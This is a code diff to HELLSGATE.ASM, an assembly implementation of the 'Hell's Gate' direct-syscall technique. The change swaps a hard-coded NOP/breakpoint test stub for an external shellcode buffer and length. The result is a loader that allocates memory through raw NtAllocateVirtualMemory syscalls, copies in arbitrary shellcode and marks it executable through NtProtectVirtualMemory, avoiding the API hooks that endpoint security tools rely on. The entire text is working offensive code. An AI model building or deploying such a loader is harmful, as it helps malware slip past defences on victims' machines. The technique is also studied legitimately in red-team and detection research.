@@ -1,16 +1,18 @@
-; @file			  HELLSGATE.ASM
-; @data			  07-08-2020
-; @author		  Paul Laîné (@am0nsec)
+; @file			HELLSGATE.ASM
+; @data			4-08-2020
+; @author		Paul Laîné (@am0nsec)
 ; @version		1.0
-; @brief		  Dynamically extracting and invoking syscalls from in-memory modules.
+; @brief		Dynamically extracting and invoking syscalls from in-memory modules.
 ; @details		
-; @link			  https://ntamonsec.blogspot.com/
+; @link			https://ntamonsec.blogspot.com/
 ; @copyright	This project has been released under the GNU Public License v3 license.
 
 include HELLSGATE.INC
 
 _DATA segment
-    Shellcode     BYTE 90h, 90h, 90h, 90h, 90h, 0cch, 0cch, 0cch, 0cch, 0c3h, 00h
+    extern Shellcode: BYTE
+    extern ShellcodeLength: QWORD
+
     wSystemCall   DWORD 000h
     lpAddress     QWORD ?
     sDataSize     QWORD ? 
@@ -169,8 +171,9 @@ _reset_loop:
 ;-----------------------------------------------------------------------------
 _payload:
         ; Initialise variables
-        mov sDataSize, 100h                                              ;
-        mov lpAddress, 0h                                                ;
+        mov r10, ShellcodeLength                                         ;
+        mov sDataSize, r10                                               ; Store shellcode length
+        mov lpAddress, 0h                                                ; 
 
         ; Execute NtAllocateVirtualMemory
         mov ax, VXTable.NtAllocateVirtualMemory.wSystemCall              ;
@@ -189,7 +192,7 @@ _payload:
         cld                                                              ; Clear direction flag == forward copy
         lea rsi, Shellcode                                               ; Origin
         mov rdi, lpAddress                                               ; Destination
-        mov rcx, SIZEOF Shellcode                                        ; Size of shellcode
+        mov rcx, ShellcodeLength                                         ; Size of shellcode
         rep movsb                                                        ; Copy byte until RCX = 0
 
         ; Execute NtProtectVirtualMemory
